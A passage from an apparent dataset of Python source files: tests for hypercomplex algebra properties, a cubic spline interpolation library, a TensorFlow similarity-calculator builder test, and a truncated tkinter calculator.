uniform(0,10)\n            calc   = abs((p1 + a*p2 + q1 + a*q2) - (p1+q1))\n            expect = a*abs(p2+q2)\n            if DEBUG:\n                print(_verbose_quaternion_metric_space().format( p1, q1, p2, q2, a, repr(calc), repr(expect)))\n            self.assertAlmostEqual(calc,expect)\n        if VERBOSE:\n            print(_verbose_quaternion_metric_space().format( p1, q1, p2, q2, a, repr(calc), repr(expect)))\n\n    def Xtest_dot_product (self):\n        \"Component vs component free dot product\"\n        object = Quaternion\n        loops = 100\n        if VERBOSE or DEBUG: \n            print(loops, 'loops')\n        for n in range(loops):\n            p = random_imaginary_vector(self.obj)\n            q = random_imaginary_vector(self.obj)\n            b1,c1,d1 = p[1:]\n            b2,c2,d2 = q[1:]\n            calc1 = 1/2*(p.conj()*q + q.conj()*p)\n            calc2 = 1/2*(p*q.conj() + q*p.conj())\n            expect = b1*b2 + c1*c2 + d1*d2\n            if DEBUG:\n                print(_verbose_quaternion_dot_product().format(p, q, calc1, calc2, expect))\n            self.assertAlmostEqual(calc1,expect)\n            self.assertAlmostEqual(calc2,expect)\n            self.assertAlmostEqual(calc1,calc2)\n        if VERBOSE:\n            print(_verbose_quaternion_dot_product().format(p, q, calc1, calc2, expect))\n\n\nclass TestOctonion(unittest.TestCase):\n    obj = Octonion\n\n    def test_unit_multiplication (self):\n        \"Octonion unit product table\"\n        expect = [ a.split() for a in octonion_table.strip().split(\"\\n\") ]\n        calc = generate_str(self.obj)\n        _test_unit_multiplication(self,expect=expect,calc=calc)\n\n    def Xtest_conjugation (self):\n        \"Long form congugation\"\n        loops = 100\n        if VERBOSE or DEBUG: \n            print(loops, 'loops')\n        for n in range(loops):\n            x = random_vector(self.obj)\n            calc = x.conj()\n            o,i,j,k,l,m,n,o = unit_list(self.obj)\n            expect = -1/6*( x + (i*x)*i + (j*x)*j + (k*x)*k + (l*x)*l + (m*x)*m + (n*x)*n + (o*x)*o )\n            if DEBUG:\n                print(\"   calc = %r\" % (calc))\n                print(\" expect = %r\" % (expect))\n            self.assertEqual(calc,expect)\n        if VERBOSE: \n            print(_verbose_octonion_conjugation())\n            _claim_equal(calc,expect)\n\n    def Xtest_conjugate_product (self):\n        \"the product of a vector with its conjugate is the multidimensional Pythagarus formula\"\n        loops = 100\n        if VERBOSE or DEBUG: \n            print(loops, 'loops')\n        for n in range(loops):\n            x = random_vector(self.obj)\n            calc = x*x.conj()\n            expect = sum([a ** 2 for a in x])\n            self.assertEqual(calc,expect)\n        if DEBUG: \n            _claim_equal(repr(calc),repr(expect))\n        if VERBOSE:\n            _claim_equal(calc,expect)\n\n\nclass TestSedenion(unittest.TestCase):\n    obj = Sedenion\n\n    def test_unit_multiplication (self):\n        \"Sedenion unit product table\"\n        expect = [ a.split() for a in sedenion_table.strip().split(\"\\n\") ]\n        calc = generate_str(self.obj)\n        _test_unit_multiplication(self,expect=expect,calc=calc)\n\n\n# Exotic Algebra tests\n\nclass TestSplitQuaternion(unittest.TestCase):\n    obj = SplitQuaternion\n\n    def test_unit_multiplication (self):\n        \"Split Quaternion unit product table\"\n        expect = [ a.split() for a in split_quaternion_table.strip().split(\"\\n\") ]\n        calc = generate_str(self.obj)\n        _test_unit_multiplication(self,expect=expect,calc=calc)\n\n    def Xtest_split_complex_generation (self):\n        \"Generation Split Quaternion from split-complex numbers\"\n        loops = 100\n        if VERBOSE or DEBUG: \n            print(loops, 'loops')\n        if DEBUG or VERBOSE: \n            print()\n        for n in range(loops):\n            q = random_vector(self.obj)\n            a = Split(q[:2])\n            b = Split(q[2:])\n            w,z = a\n            y,x = b\n            pre_calc = w**2 + x**2 - y**2 - z**2\n            calc = Split([pre_calc,0])\n            expect = a*a.conj() - b*b.conj()\n            if DEBUG:\n                _claim_equal(repr(calc),repr(expect))\n            self.assertEqual(calc,expect)\n        if VERBOSE:\n            print(_verbose_split_quaternion_conjugate())\n            _claim_equal(calc,expect)\n\n    def Xtest_nilpotent(self):\n        \"Test Split Quaternion nilpotent - a number whose square is zero\"\n        o,i,j,k = unit_list(self.obj)\n        for unit in [-k, -j, k, j]:\n            q = i-unit\n            calc = q*q\n            expect = self.obj([0,0,0,0])\n            if VERBOSE:\n                print(_verbose_split_quaternion_nilpotent().format(q, calc, expect))\n            self.assertAlmostEqual(calc,expect)\n\n    def Xtest_idempotent(self):\n        \"Test Split Quaternion nilpotent - a number whose square is zero\"\n        o,i,j,k = unit_list(self.obj)\n\n        # todo: There must be more of these...\n\n        q = 1/2*(o+j)\n        calc = q*q\n        expect = q\n        if DEBUG:\n            print(\"\\n%8s = %r\" % ('q',q))\n            print(\"\\n%8s = %r\" % ('q\u00d7q',calc))\n        if VERBOSE:\n            print(_verbose_split_quaternion_idempotent().format(q, calc, expect))\n        self.assertAlmostEqual(calc,expect)\n\n\nclass TestSplitOctonion(unittest.TestCase):\n    obj = SplitOctonion\n\n    def test_unit_multiplication (self):\n        \"SplitOctonion unit product table\"\n        expect = [ a.split() for a in split_octonion_table.strip().split(\"\\n\") ]\n        calc = generate_str(self.obj)\n        _test_unit_multiplication(self,expect=expect,calc=calc)\n\n    def Xtest_conjugation (self):\n        \"Long form congugation\"\n        loops = 100\n        if VERBOSE or DEBUG: \n            print(loops, 'loops')\n        for _ in range(loops):\n            z = random_vector(self.obj)\n            calc = z.conj()\n            x,i,j,k,l,m,n,o = unit_list(self.obj)\n            expect = x*z[0] - i*z[1] - j*z[2] - k*z[3]- l*z[4] - m*z[5] - n*z[6] - o*z[7]\n            if DEBUG:\n                _claim_equal(repr(calc),repr(expect))\n            self.assertEqual(calc,expect)\n        if VERBOSE: \n            print(_verbose_split_octonion_conjugation())\n            _claim_equal(calc,expect)\n\n    def Xtest_conjugate_product (self):\n        \"the product of a vector with its conjugate is the multidimensional Pythagarus formula\"\n        loops = 100\n        if VERBOSE or DEBUG: \n            print(loops, 'loops')\n        for n in range(loops):\n            x = random_vector(self.obj)\n            calc = x*x.conj()\n            expect = sum([a ** 2 for a in x[:4]]) - sum([a ** 2 for a in x[4:]])\n            self.assertEqual(calc,expect)\n        if DEBUG: \n            _claim_equal(repr(calc),repr(expect))\n        if VERBOSE:\n            _claim_equal(calc,expect)\n\n\nclass TestDualComplex(unittest.TestCase):\n    obj = DualComplex\n\n    def test_unit_multiplication (self):\n        \"DualComplex unit product table\"\n        expect = [ a.split() for a in dual_complex_table.strip().split(\"\\n\") ]\n        calc = generate_str(self.obj)\n        _test_unit_multiplication(self,expect=expect,calc=calc)\n\n\nclass TestDualQuaternion(unittest.TestCase):\n    obj = DualQuaternion\n\n    def test_unit_multiplication (self):\n        \"DualQuaternion unit product table\"\n        expect = [ a.split() for a in dual_quaternion_table.strip().split(\"\\n\") ]\n        calc = generate_str(self.obj)\n        _test_unit_multiplication(self,expect=expect,calc=calc)\n\n\nclass TestHyperbolicQuaternion(unittest.TestCase):\n    obj = HyperbolicQuaternion\n\n    def test_unit_multiplication (self):\n        \"HyperbolicQuaternion unit product table\"\n        expect = [ a.split() for a in hyperbolic_quaternion_table.strip().split(\"\\n\") ]\n        calc = generate_str(self.obj)\n        _test_unit_multiplication(self,expect=expect,calc=calc)\n\n\n# Algebraic property tests\n\nclass Commutative():\n    \"\"\"Commutative Product tests\"\"\"\n\n    def _is_commutative(self, obj, loops=100):\n        d = dim(obj)\n        if VERBOSE or DEBUG: \n            print(loops, 'loops')\n        for n in range(loops):\n            x = random_vector(obj)\n            y = random_vector(obj)\n            x * y\n            if d > 2:\n                self.assertNotEqual(x*y,y*x)\n            else:\n                self.assertEqual(x*y,y*x)\n        if DEBUG: \n            print(\"x \u00d7 y = %r\" % (x*y))\n            print(\"y \u00d7 x = %r\" % (y*x))\n        if VERBOSE:\n            print(_verbose_commutative().format((' NOT' if d>2 else ''),x*y,y*x,obj.__name__))\n\n    def test_complex(self):\n        self._is_commutative(Complex, loops=5000)\n\n    def test_quaternion(self):\n        self._is_commutative(Quaternion, loops=1000)\n\n    def test_octonion(self):\n        self._is_commutative(Octonion, loops=300)\n\n    def test_sedenion(self):\n        self._is_commutative(Sedenion)\n\n    def test_cd32(self):\n        self._is_commutative(Cd32,loops=50)\n\n\nclass WeakAlternative():\n\n    def _is_weak_alternative(self, obj, loops=100):\n        \"Weak Alternative Condition tests\"\n        d = dim(obj)\n        if VERBOSE or DEBUG: \n            print(loops, 'loops')\n        for n in range(loops):\n            x = random_vector(obj)\n            y = random_vector(obj)\n            if d < 16:\n                self.assertEqual((y*x)*x, y*(x*x))\n                self.assertEqual((x*y)*x, x*(y*x))\n                self.assertEqual((x*x)*y, x*(x*y))\n                self.assertEqual((x*y)*y, x*(y*y))\n                self.assertEqual((y*x)*y, y*(x*y))\n                self.assertEqual((y*y)*x, y*(y*x))\n            else:\n                self.assertEqual((x*y)*x, x*(y*x))\n                self.assertEqual((y*x)*y, y*(x*y))\n                self.assertNotEqual((y*x)*x, y*(x*x))\n                self.assertNotEqual((x*x)*y, x*(x*y))\n                self.assertNotEqual((x*y)*y, x*(y*y))\n                self.assertNotEqual((y*y)*x, y*(y*x))\n        if VERBOSE:\n            print(_verbose_weak_alternative().format(x,y,(y*x)*x,y*(x*x),(x*y)*x,x*(y*x),(x*x)*y,x*(x*y),(x*y)*y,x*(y*y),(y*x)*y,y*(x*y),(y*y)*x,y*(y*x),(' NOT' if d>8 else ''),obj.__name__))\n\n    def test_complex(self):\n        self._is_weak_alternative(Complex,loops=1000)\n\n    def test_quaternion(self):\n        self._is_weak_alternative(Quaternion, loops=300)\n\n    def test_octonion(self):\n        self._is_weak_alternative(Octonion)\n\n    def test_sedenion(self):\n        self._is_weak_alternative(Sedenion,loops=15)\n\n    def test_32ion(self):\n        self._is_weak_alternative(Cd32,loops=10)\n\n\nclass DiophantusIdentity():\n    \"\"\"\n    Diophantus identity test\n    Brahmagupta\u2013Fibonacci / Diophantus identity\n    \"\"\"\n\n    def _is_diophantus_identity(self, obj, loops=100):\n        \"Diophantus identity test\"\n        PRECISION = 10**-9\n        d = dim(obj)\n        if VERBOSE or DEBUG: \n            print(loops, 'loops')\n        for n in range(loops):\n            x = random_vector(obj)\n            y = random_vector(obj)\n            if d > 8:\n                self.assertNotAlmostEqual(abs(x) * abs(y), abs(x*y), delta=PRECISION)\n            else:\n                self.assertAlmostEqual(abs(x) * abs(y), abs(x*y), delta=PRECISION)\n\n        if VERBOSE:\n            print(_verbose_diophantus().format(x,y,abs(x),abs(y),(' NOT' if d>8 else ''),abs(x)*abs(y),abs(x*y)))\n\n    def test_complex(self):\n        self._is_diophantus_identity(Complex,loops=20000)\n\n    def test_quaternion(self):\n        self._is_diophantus_identity(Quaternion, loops=1000)\n\n    def test_octonion(self):\n        self._is_diophantus_identity(Octonion, loops=1000)\n\n    #def test_sedenion(self):\n        #self._is_diophantus_identity(Sedenion,loops=300)\n\n    #def test_32ion(self):\n        #self._is_diophantus_identity(Cd32,loops=200)\n\n    #def test_split_octonion(self):\n        #self._is_diophantus_identity(SplitOctonion, loops=300)\n\n\nclass MoufangCondition():\n    \"\"\"Moufang condition tests\"\"\"\n\n    def _is_moufang_condition(self, obj, loops=100):\n        \"Moufang condition tests\"\n        dm = dim(obj)\n        if VERBOSE or DEBUG: \n            print(loops, 'loops')\n        for n in range(loops):\n            x = random_vector(obj)\n            y = random_vector(obj)\n            z = random_vector(obj)\n            a = z*(x*(z*y))\n            b = ((z*x)*z)*y\n            c = x*(z*(y*z))\n            d = ((x*z)*y)*z\n            e = (z*x)*(y*z)\n            f = (z*(x*y))*z\n            g = (z*x)*(y*z)\n            h = z*((x*y)*z)\n            if dm > 8:\n                self.assertNotEqual(a,b)\n                self.assertNotEqual(c,d)\n                self.assertNotEqual(e,f)\n                self.assertNotEqual(g,h)\n            else:\n                self.assertEqual(a,b)\n                self.assertEqual(c,d)\n                self.assertEqual(e,f)\n                self.assertEqual(g,h)\n        if DEBUG:\n            print(\"%8s: %r\\n\" % ('x',x))\n            print(\"%8s: %r\\n\" % ('y',y))\n            print(\"%8s: %r\\n\" % ('z',z))\n        if VERBOSE:\n            a = z*(x*(z*y))\n            b = ((z*x)*z)*y\n            c = x*(z*(y*z))\n            d = ((x*z)*y)*z\n            e = (z*x)*(y*z)\n            f = (z*(x*y))*z\n            g = (z*x)*(y*z)\n            h = z*((x*y)*z)\n            print(_verbose_moufang_condition().format(x,y,z,a,b,c,d,e,f,g,h,' NOT' if dm>8 else '', obj.__name__))\n\n    def test_complex(self):\n        self._is_moufang_condition(Complex,loops=500)\n\n    def test_quaternion(self):\n        self._is_moufang_condition(Quaternion, loops=150)\n\n    def test_octonion(self):\n        self._is_moufang_condition(Octonion, loops=50)\n\n    def test_sedenion(self):\n        self._is_moufang_condition(Sedenion,loops=15)\n\n    def test_32ion(self):\n        self._is_moufang_condition(Cd32,loops=10)\n\n    #def test_split_octonion(self):\n        #self._is_moufang_condition(SplitOctonion, loops=300)\n\n\nclass PowerAssociative():\n    \"\"\"Power Associative tests\"\"\"\n\n    def _is_power_associative(self, obj, loops=100):\n        PRECISION = 10**-9\n        d = dim(obj)\n        if VERBOSE or DEBUG: \n            print(loops, 'loops')\n        for n in range(loops):\n            x = random_vector(obj).normalize()\n            y = random_vector(obj).normalize()\n            z = x * y\n            self.assertAlmostEqual(abs(x),1,delta=PRECISION)\n            self.assertAlmostEqual(abs(y),1,delta=PRECISION)\n            if d > 8:\n                # this logic is questionable!!!\n                self.assertAlmostEqual(abs(z),1,delta=10**-1)\n            else:\n                self.assertAlmostEqual(abs(z),1,delta=PRECISION)\n        if DEBUG or 1:\n            print(_debug_power_associative().format(repr(x), repr(y), repr(x*y)))\n            # why these don't work...\n            #print(_debug_power_associative().format( tuple(repr(i) for i in (x,y,x*y)) ))\n            #print(_debug_power_associative().format( tuple([repr(i) for i in (x,y,x*y)]) ))\n            #print(_debug_power_associative().format( (repr(i) for i in (x,y,x*y)]) ))\n\n        if VERBOSE:\n            print( _verbose_power_associative().format(x,y,z,abs(x),abs(y),abs(z),abs(z)-1) )\n\n    #def test_complex(self):\n        #self._is_power_associative(Complex,loops=8000)\n\n    #def test_quaternion(self):\n        #self._is_power_associative(Quaternion, loops=2400)\n\n    #def test_octonion(self):\n        #self._is_power_associative(Octonion, loops=800)\n\n    #def test_sedenion(self):\n        #self._is_power_associative(Sedenion,loops=120)\n\n    #def test_32ion(self):\n        #self._is_power_associative(Cd32,loops=80)\n\n    #def test_split_octonion(self):\n        #self._is_power_associative(SplitOctonion, loops=300)\n\n\nclass TwoSquareIdentity():\n    \"\"\"Two square identity\"\"\"\n\n    def test_two_square_identity(self):\n        obj = Complex\n        x = random_vector(obj)\n        y = random_vector(obj)\n        calc = x*y\n        formula = obj(two_square_identity(x,y))\n        self.assertEqual(formula, calc)\n        if VERBOSE:\n            print(_verbose_square_identity(x,y,formula,calc,\"Brahmagupta-Fibonacci's Two\"))\n\n\nclass FourSquareIdentity():\n    \"\"\"Four square identity\"\"\"\n\n    def test_four_square_identity(self):\n        obj = Quaternion\n        x = random_vector(obj)\n        y = random_vector(obj)\n        calc = x*y\n        formula = obj(four_square_identity(x,y))\n        self.assertEqual(formula, calc)\n        if VERBOSE:\n            print(_verbose_square_identity(x,y,formula,calc,\"Euler's Four\"))\n\n\nclass EightSquareIdentity():\n    \"\"\"Eight square identity\"\"\"\n\n    def test_eight_square_identity(self):\n        obj = Octonion\n        x = random_vector(obj)\n        y = random_vector(obj)\n        calc = x*y\n        formula = obj(eight_square_identity(x,y))\n        self.assertEqual(formula, calc)\n        if VERBOSE:\n            print(_verbose_square_identity(x,y,formula,calc,\"Degen's Eight\"))\n\n\nclass SixteenSquareIdentity():\n    \"\"\"Sixteen square identity\"\"\"\n\n    def test_sixteen_square_identity(self):\n        obj = Sedenion\n        x = random_vector(obj)\n        y = random_vector(obj)\n        calc = x*y\n        formula = obj(sixteen_square_identity(x,y))\n        self.assertAlmostEqual(formula, calc)\n        if VERBOSE:\n            print(_verbose_square_identity(x,y,formula,calc,\"Pfister's Sixteen\"))\n\n\n# run all tests on execute...\n\nif __name__ == '__main__':\n\n    unittest.main(verbosity=2)\n\n", "372": "\"\"\"\nCubic Spline library on python\nauthor Atsushi Sakai\n\"\"\"\nimport bisect\nimport math\n\nimport numpy as np\n\n\nclass Spline:\n    \"\"\"\n    Cubic Spline class\n    \"\"\"\n\n    def __init__(self, x, y):\n        self.b, self.c, self.d, self.w = [], [], [], []\n\n        self.x = x\n        self.y = y\n\n        self.nx = len(x)  # dimension of x\n        h = np.diff(x)\n\n        # calc coefficient c\n        self.a = [iy for iy in y]\n\n        # calc coefficient c\n        A = self.__calc_A(h)\n        B = self.__calc_B(h)\n        self.c = np.linalg.solve(A, B)\n\n        # calc spline coefficient b and d\n        for i in range(self.nx - 1):\n            self.d.append((self.c[i + 1] - self.c[i]) / (3.0 * h[i]))\n            tb = (self.a[i + 1] - self.a[i]) / h[i] - h[i] * \\\n                 (self.c[i + 1] + 2.0 * self.c[i]) / 3.0\n            self.b.append(tb)\n\n    def calc(self, t):\n        \"\"\"\n        Calc position\n        if t is outside of the input x, return None\n        \"\"\"\n\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = self.a[i] + self.b[i] * dx + self.c[i] * dx ** 2.0 + self.d[i] * dx ** 3.0\n\n        return result\n\n    def calc_d(self, t):\n        \"\"\"\n        Calc first derivative\n        if t is outside of the input x, return None\n        \"\"\"\n\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = self.b[i] + 2.0 * self.c[i] * dx + 3.0 * self.d[i] * dx ** 2.0\n        return result\n\n    def calc_dd(self, t):\n        \"\"\"\n        Calc second derivative\n        \"\"\"\n\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = 2.0 * self.c[i] + 6.0 * self.d[i] * dx\n        return result\n\n    def __search_index(self, x):\n        return bisect.bisect(self.x, x) - 1\n\n    def __calc_A(self, h):\n        A = np.zeros((self.nx, self.nx))\n        A[0, 0] = 1.0\n        for i in range(self.nx - 1):\n            if i != (self.nx - 2):\n                A[i + 1, i + 1] = 2.0 * (h[i] + h[i + 1])\n            A[i + 1, i] = h[i]\n            A[i, i + 1] = h[i]\n\n        A[0, 1] = 0.0\n        A[self.nx - 1, self.nx - 2] = 0.0\n        A[self.nx - 1, self.nx - 1] = 1.0\n        #  print(A)\n        return A\n\n    def __calc_B(self, h):\n        \"\"\"\n        calc matrix B for spline coefficient c\n        \"\"\"\n        B = np.zeros(self.nx)\n        for i in range(self.nx - 2):\n            B[i + 1] = 3.0 * (self.a[i + 2] - self.a[i + 1]) / \\\n                       h[i + 1] - 3.0 * (self.a[i + 1] - self.a[i]) / h[i]\n        #  print(B)\n        return B\n\n    def calc_curvature(self, t):\n        j = int(math.floor(t))\n        if j < 0:\n            j = 0\n        elif j >= len(self.a):\n            j = len(self.a) - 1\n\n        dt = t - j\n        df = self.b[j] + 2.0 * self.c[j] * dt + 3.0 * self.d[j] * dt * dt\n        ddf = 2.0 * self.c[j] + 6.0 * self.d[j] * dt\n        k = ddf / ((1 + df ** 2) ** 1.5)\n        return k\n\n\nclass Spline2D:\n    \"\"\"\n    2D Cubic Spline class\n    \"\"\"\n\n    def __init__(self, x, y):\n        self.s = self.__calc_s(x, y)\n        self.sx = Spline(self.s, x)\n        self.sy = Spline(self.s, y)\n\n    def __calc_s(self, x, y):\n        dx = np.diff(x)\n        dy = np.diff(y)\n        self.ds = [math.sqrt(idx ** 2 + idy ** 2)\n                   for (idx, idy) in zip(dx, dy)]\n        s = [0.0]\n        s.extend(np.cumsum(self.ds))\n        return s\n\n    def calc_position(self, s):\n        \"\"\"\n        calc position\n        \"\"\"\n        x = self.sx.calc(s)\n        y = self.sy.calc(s)\n\n        return x, y\n\n    def calc_curvature(self, s):\n        \"\"\"\n        calc curvature\n        \"\"\"\n        dx = self.sx.calc_d(s)\n        ddx = self.sx.calc_dd(s)\n        dy = self.sy.calc_d(s)\n        ddy = self.sy.calc_dd(s)\n        k = (ddy * dx - ddx * dy) / (dx ** 2 + dy ** 2) ** 1.5\n        return k\n\n    def calc_yaw(self, s):\n        \"\"\"\n        calc yaw\n        \"\"\"\n        dx = self.sx.calc_d(s)\n        dy = self.sy.calc_d(s)\n        yaw = math.atan2(dy, dx)\n        return yaw\n\n\ndef calc_2d_spline_interpolation(x, y, num=100):\n    \"\"\"\n    Calc 2d spline course with interpolation\n    :param x: interpolated x positions\n    :param y: interpolated y positions\n    :param num: number of path points\n    :return:\n        - x     : x positions\n        - y     : y positions\n        - yaw   : yaw angle list\n        - k     : curvature list\n        - s     : Path length from start point\n    \"\"\"\n    sp = Spline2D(x, y)\n    s = np.linspace(0, sp.s[-1], num+1)[:-1]\n\n    r_x, r_y, r_yaw, r_k = [], [], [], []\n    for i_s in s:\n        ix, iy = sp.calc_position(i_s)\n        r_x.append(ix)\n        r_y.append(iy)\n        r_yaw.append(sp.calc_yaw(i_s))\n        r_k.append(sp.calc_curvature(i_s))\n\n    travel = np.cumsum([np.hypot(dx, dy) for dx, dy in zip(np.diff(r_x), np.diff(r_y))]).tolist()\n    travel = np.concatenate([[0.0], travel])\n\n    return r_x, r_y, r_yaw, r_k, travel\n\n\ndef test_spline2d():\n    print(\"Spline 2D test\")\n    import matplotlib.pyplot as plt\n    input_x = [-2.5, 0.0, 2.5, 5.0, 7.5, 3.0, -1.0]\n    input_y = [0.7, -6, 5, 6.5, 0.0, 5.0, -2.0]\n\n    x, y, yaw, k, travel = calc_2d_spline_interpolation(input_x, input_y, num=200)\n\n    plt.subplots(1)\n    plt.plot(input_x, input_y, \"xb\", label=\"input\")\n    plt.plot(x, y, \"-r\", label=\"spline\")\n    plt.grid(True)\n    plt.axis(\"equal\")\n    plt.xlabel(\"x[m]\")\n    plt.ylabel(\"y[m]\")\n    plt.legend()\n\n    plt.subplots(1)\n    plt.plot(travel, [math.degrees(i_yaw) for i_yaw in yaw], \"-r\", label=\"yaw\")\n    plt.grid(True)\n    plt.legend()\n    plt.xlabel(\"line length[m]\")\n    plt.ylabel(\"yaw angle[deg]\")\n\n    plt.subplots(1)\n    plt.plot(travel, k, \"-r\", label=\"curvature\")\n    plt.grid(True)\n    plt.legend()\n    plt.xlabel(\"line length[m]\")\n    plt.ylabel(\"curvature [1/m]\")\n\n    plt.show()\n\ndef calc_spline_course(x, y, ds=0.1):\n    sp = Spline2D(x, y)\n    s = list(np.arange(0, sp.s[-1], ds))\n\n    rx, ry, ryaw, rk = [], [], [], []\n    for i_s in s:\n        ix, iy = sp.calc_position(i_s)\n        rx.append(ix)\n        ry.append(iy)\n        ryaw.append(sp.calc_yaw(i_s))\n        rk.append(sp.calc_curvature(i_s))\n\n    return rx, ry, ryaw, rk, s\n\n\ndef test_spline():\n    print(\"Spline test\")\n    import matplotlib.pyplot as plt\n    x = [-0.5, 0.0, 0.5, 1.0, 1.5]\n    y = [3.2, 2.7, 6, 5, 6.5]\n\n    spline = Spline(x, y)\n    rx = np.arange(-2.0, 4, 0.01)\n    ry = [spline.calc(i) for i in rx]\n\n    plt.plot(x, y, \"xb\")\n    plt.plot(rx, ry, \"-r\")\n    plt.grid(True)\n    plt.axis(\"equal\")\n    plt.show()\n\n\nif __name__ == '__main__':\n    test_spline()\n    test_spline2d()", "373": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow.compat.v1 as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "374": "import tkinter as tk\r\n\r\nwindow = tk.Tk()\r\n\r\nlbl_calc_result = tk.Label(\r\n    master= window,\r\n    text= '0',\r\n    width= 30,\r\n    height=3,\r\n)\r\nlbl_calc_result.grid(row=0, column=0 , columnspan=4)\r\n\r\nlast_operator_index = -1\r\nlast_dot_index = -1\r\ndef insert_number_in_calc_result(button_number):\r\n    global last_operator_index , last_dot_index\r\n    current = lbl_calc_result['text']\r\n\r\n    if button_number in ['+', '-' , '*']:\r\n        last_operator_index = len(current)\r\n\r\n    if button_number == 'C':\r\n        lbl_calc_result['text'] = '0'\r\n        last_operator_index, last_dot_index = -1,-1\r\n    elif current == '0': \r\n        lbl_calc_result['text'] = button_number\r\n    elif button_number == '=':\r\n        if current[-1] in ['+', '-' , '*']:\r\n            current = current[:-1]      \r\n        result = f'{eval(current)}'\r\n        lbl_calc_result['text'] = result \r\n        last_operator_index , last_dot_index = -1 , -1\r\n        if '.' in lbl_calc_result['text']:\r\n            last_dot_index = result.index('.')\r\n    else:\r\n        if button_number == '.':\r\n            if last_dot_index > last_operator_index:\r\n                pass\r\n            elif current[-1] == '.':\r\n                pass\r\n            else:\r\n                lbl_calc_result['text'] += button_number\r\n                last_dot_index = len(current)\r\n\r\n        elif button_number in ['+', '-' , '*']:\r\n            if current[-1] in ['+', '-' , '*']:\r\n                lbl_calc_result['text'] = current[:-1] + button_number\r\n            else:\r\n                lbl_calc_result['text'] += button_number\r\n        else:\r\n            lbl_calc_result['text'] += button_number\r\n\r\n\r\ncalc_list = [\r\n    {\r\n        'text' : '7',\r\n        'command' : lambda:insert_number_in_calc_result('7'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '8',\r\n        'command' : lambda:insert_number_in_calc_result('8'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '9',\r\n        'command' : lambda:insert_number_in_calc_result('9'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '+',\r\n        'command' : lambda:insert_number_in_calc_result('+'),\r\n        'bg' : 'white' ,\r\n    },\r\n        {\r\n        'text' : '4',\r\n        'command' : lambda:insert_number_in_calc_result('4'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '5',\r\n        'command' : lambda:insert_number_in_calc_result('5'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '6',\r\n        'command' : lambda:insert_number_in_calc_result('6'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '-',\r\n        'command' : lambda:insert_number_in_calc_result('-'),\r\n        'bg' : 'white' ,\r\n    },\r\n            {\r\n        'text' : '1',\r\n        'command' : lambda:insert_number_in_calc_result('1'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '2',\r\n        'command' : lambda:insert_number_in_calc_result('2'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '3',\r\n        'command' : lambda:insert_number_in_calc_result('3'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '*',\r\n        'command' : lambda:insert_number_in_calc_result('*'),\r\n        'bg' : 'white' ,\r\n    },\r\n                {\r\n        'text' : '.',\r\n        'command' : lambda:insert_number_in_calc_result('.'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '0',\r\n        'command' : lambda:insert_number_in_calc_result('0'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : 'C',\r\n        'command' : lambda:insert_number_in_calc_result('C'),\r\n        'bg' : '#f4004f' , \r\n    },\r\n    {\r\n        'text' : '=',\r\n        'command' : lambda:insert_number_in_calc_result('='),\r\n        'bg' : 'white' ,\r\n    },\r\n    \r\n]\r\n\r\ncalc_key_objs = []\r\n\r\nfor calc_key_data in calc_list:\r\n    btn = tk.Button(\r\n        master= window,\r\n        text=calc_key_data['text'],\r\n        command=calc_key_data['command'],\r\n        height=3,\r\n        bg=calc_key_data['bg'],\r\n    )\r\n    